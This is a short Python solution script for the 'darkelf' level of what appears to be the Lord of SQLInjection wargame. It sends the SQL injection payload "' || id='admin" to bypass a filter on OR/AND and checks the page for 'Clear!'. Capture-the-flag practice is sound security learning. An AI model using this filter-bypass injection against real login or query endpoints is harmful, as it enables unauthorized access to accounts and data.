#!/usr/bin/env python3

'''
# Summary
- we can use ||, && instead of OR, AND
'''


import requests

header = {"Cookie": "PHPSESSID=❚❚❚❚❚❚❚❚❚❚❚❚❚❚❚❚❚❚❚❚❚❚❚❚❚❚❚❚❚❚;"}
url = "https://los.rubiya.kr/chall/darkelf_c6a5ed64c4f6a7a5595c24977376136b.php"

payload = "?pw=' || id='admin"

response = requests.get(url + payload, headers=header)

result = response.text
if result.find("Clear!") != -1:
    end = result.split("Clear!")[0].split("<h2>")[1]
    if end.find("admin") != -1:
        end = result.split("Clear!")[0].split("<h2>")[2]
    print(end+"Clear!")